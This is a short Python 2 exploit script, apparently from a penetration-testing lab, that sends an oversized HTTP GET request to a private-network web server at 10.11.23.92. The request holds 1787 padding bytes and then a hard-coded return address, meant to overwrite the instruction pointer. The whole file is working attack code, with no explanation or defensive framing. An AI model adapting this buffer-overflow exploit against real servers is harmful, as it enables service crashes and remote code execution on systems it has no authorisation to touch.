#!/usr/bin/python
import sys
import socket

# 76cd5d33 = \x33\x5d\xcd\x76
crash = "A" * 1787 + "\x33\x5d\xcd\x76"
shellcode = 'GET ' + crash + 'HTTP/1.1\r\n\r\n'

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect(('10.11.23.92',80))
	s.send(shellcode)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 